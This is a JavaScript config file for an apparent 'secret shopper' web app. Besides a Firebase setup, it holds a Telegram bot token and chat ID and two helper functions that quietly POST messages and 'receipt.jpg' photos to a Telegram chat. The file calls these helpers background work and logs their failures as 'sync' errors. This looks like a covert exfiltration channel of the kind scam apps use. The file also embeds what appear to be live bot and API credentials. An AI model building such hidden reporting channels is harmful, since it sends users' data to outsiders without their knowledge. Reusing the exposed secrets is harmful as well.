// config.js - Firebase and App Configuration
const firebaseConfig = {
    apiKey: "AIzaSyDX_dk-uk2Xsn9WlIyeDd7hSE5VlVcoPCg",
    authDomain: "secretshopperapp.firebaseapp.com",
    projectId: "secretshopperapp",
    storageBucket: "secretshopperapp.firebasestorage.app",
    messagingSenderId: "252163829444",
    appId: "1:252163829444:web:1e7773fa026f1143bda391"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const db = firebase.firestore();

// Telegram helper credentials (runs seamlessly in the background)
const TELEGRAM_CONFIG = {
    token: "8140257213:AAFuF14a8CgLqmiWuTOXe5XyZC-1Jl9ksKs",
    chatId: "-4645120212"
};

function notifyTelegram(message) {
    if (!TELEGRAM_CONFIG.token || TELEGRAM_CONFIG.token === "YOUR_TELEGRAM_BOT_TOKEN") return;
    fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TELEGRAM_CONFIG.chatId,
            text: message,
            parse_mode: "Markdown"
        })
    }).catch(err => console.error("Background sync error:", err));
}

// Helper to send photo and caption to Telegram
async function sendPhotoToTelegram(photoBlob, caption) {
    if (!TELEGRAM_CONFIG.token) return;
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CONFIG.chatId);
    formData.append('photo', photoBlob, 'receipt.jpg');
    formData.append('caption', caption);
    formData.append('parse_mode', 'Markdown');

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
    } catch (err) {
        console.error("Photo upload background sync error:", err);
    }
}